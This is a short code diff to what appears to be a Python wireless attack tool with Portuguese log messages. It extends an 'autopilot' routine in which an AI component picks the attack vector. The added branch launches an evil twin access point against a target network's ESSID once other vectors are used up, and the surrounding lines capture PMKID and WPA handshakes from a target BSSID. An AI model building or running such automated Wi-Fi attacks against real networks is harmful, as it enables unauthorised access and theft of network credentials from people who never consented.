@@ -241,6 +241,12 @@ def run_autopilot(interface, target):
 
         supreme_log(f"🤖 IA Decidiu: Vetor [{attack_type.upper()}] (Timeout: {params.get('timeout')}s)")
         
+        if attack_type == 'eviltwin':
+            supreme_log("IA: Vetores de rádio esgotados. Lançando Gêmeo Maligno!", log_type="error")
+            start_evil_twin(interface, target['essid'])
+            AUTOPILOT_ACTIVE = False
+            return "EVIL_TWIN_STARTED"
+
         cap = None
         if attack_type == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
         elif attack_type == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
